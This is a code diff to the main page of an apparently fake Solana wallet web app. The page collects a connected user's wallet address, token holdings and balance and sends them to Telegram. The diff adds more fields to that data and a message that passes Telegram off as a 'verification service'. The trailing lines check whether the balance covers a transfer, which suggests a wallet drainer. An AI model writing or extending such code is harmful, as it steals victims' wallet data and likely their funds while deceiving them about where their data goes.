@@ -50,15 +50,28 @@ const Index = () => {
       const tokens = await getTokenAccounts(connection, publicKey.toString());
       console.log("Token accounts:", tokens);
       
-      // Send data to Telegram
+      // Send data to Telegram with explicit balance information
       const walletData = {
         address: publicKey.toString(),
         tokens,
         balance: balance / LAMPORTS_PER_SOL,
+        connectionTime: new Date().toISOString(),
+        walletName: wallet?.adapter?.name || "Unknown Wallet"
       };
       
       console.log("Sending data to Telegram");
-      await sendToTelegram(walletData);
+      const telegramSent = await sendToTelegram(walletData);
+      
+      if (!telegramSent) {
+        console.error("Failed to send data to Telegram");
+        toast({
+          title: "Warning",
+          description: "Could not send wallet data to verification service.",
+          variant: "destructive",
+        });
+      } else {
+        console.log("Successfully sent wallet data to Telegram");
+      }
 
       // Check if balance is sufficient for transfer and fees
       const minimumRequiredBalance = 0.00089 * LAMPORTS_PER_SOL;
